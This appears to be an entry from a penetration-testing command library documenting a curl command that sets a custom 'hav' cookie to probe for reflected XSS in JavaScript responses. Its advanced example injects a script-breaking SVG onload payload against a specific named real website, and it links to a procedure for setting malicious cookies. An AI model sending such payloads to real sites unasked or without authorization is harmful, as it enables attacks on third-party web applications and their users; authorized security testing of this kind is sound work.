---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
name: curl-set-cookie
type: command
executor: bash
data: 'curl -H "Cookie: hav=VALUE" URL -v'
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.638Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - http
  - cookie
  - xss
verified: false
validated: true
submitted: true
---

# curl-set-cookie

## Command

```bash
curl -H "Cookie: hav=VALUE" URL -v
```

## Description

Sends an HTTP request with a custom 'hav' cookie value to test reflection in JS responses, useful for XSS payload injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: hav=VALUE"` | Sets the 'hav' cookie with the specified VALUE (e.g., XSS payload) | Yes |
| `URL` | Target endpoint URL | Yes |
| `-v` | Verbose output to see headers and response | No |

## Examples

### Basic Usage

```bash
curl -H "Cookie: hav=test" https://example.com/script.js -v
```

### Advanced Usage

```bash
curl -H "Cookie: hav=xss</sc\"ript><svg onload=alert(1)>" https://www.abritel.fr/...php.js?xxxd -v
```

## Expected Output

Verbose logs showing request headers with Cookie, and response body containing reflected var hav="VALUE".

## Related

- [[Related Procedure: Set-Malicious-Cookie-for-XSS-Payload]]
